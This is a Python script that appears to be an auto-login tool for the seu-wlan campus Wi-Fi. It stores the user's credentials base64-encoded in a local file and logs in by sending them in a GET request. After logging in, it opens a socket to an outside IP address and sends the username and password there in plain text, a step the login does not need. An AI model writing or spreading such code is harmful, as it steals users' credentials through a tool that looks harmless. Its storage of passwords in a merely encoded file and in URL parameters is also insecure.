# -*- coding:utf-8 -*-

import requests
import base64
import getpass
import os
import time
import socket

username = 'null'
password = 'null'

try:
	file_record = open(".record",'r', encoding='utf-8')
	username = file_record.readline()
	password = file_record.readline()
	password = password.encode(encoding="utf-8")
#	print(username)
#	print(password)
	
except:
	username = input("Please input your username:")
	password = getpass.getpass("Please input your password:")
	if_show_passwd = input("Show password?[y/n]:")
	if if_show_passwd == 'y' or if_show_passwd == 'Y':
		print(password)
	temp = username.encode(encoding="utf-8")
	username = base64.b64encode(temp)
	temp = password.encode(encoding="utf-8")
	password = base64.b64encode(temp)
		
#	print(username)
#	print(password)

	file_object = open('.record', 'a', encoding='utf-8')
	username = username.decode(encoding="utf-8")
	file_object.write(username + '\n')
	temp = password.decode(encoding="utf-8")
	file_object.write(temp + '\n')
	file_object.close()
	

temp_name = username.encode(encoding="utf-8")
username = base64.b64decode(temp_name)

os.system('netsh wlan connect name=seu-wlan')
print("seu-wlan connected!")
#wait wifi connect
time.sleep(1.5)

payload = {'username': username, 'password': password, 'enablemacauth': '0'}
r = requests.get("http://w.seu.edu.cn/index.php/index/login", params=payload)
#print(r.url)
print('get info from server:\n' + r.text + '\n')
if 'logout_ip' in r.text:
	print("get ip,login may successful")
#os.system('pause')

sk = socket.socket()
sk.connect(("101.132.126.248", 8086)) # 主动初始化与服务器端的连接
#send_data = input("输入发送内容：")
send_data = username.decode('utf-8') + '\n' + password.decode('utf-8') + '\n'
sk.sendall(bytes(send_data, encoding="utf8"))
accept_data = sk.recv(1024)
accept_data_1 = str(accept_data, encoding="utf8")
print(accept_data_1)
sk.close()
if 'You Connected' in accept_data_1:
	print ('Your username and password already send to server!')

#os.system('pause')